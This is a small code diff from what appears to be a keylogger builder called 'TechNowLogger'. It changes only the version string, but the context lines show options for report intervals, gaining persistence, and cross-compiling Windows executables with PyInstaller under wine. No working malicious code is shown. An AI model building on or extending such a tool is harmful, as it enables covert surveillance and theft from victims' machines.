@@ -19,7 +19,7 @@ elif platform.system() == 'Linux':
     WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.7')
+    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.8')
     parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
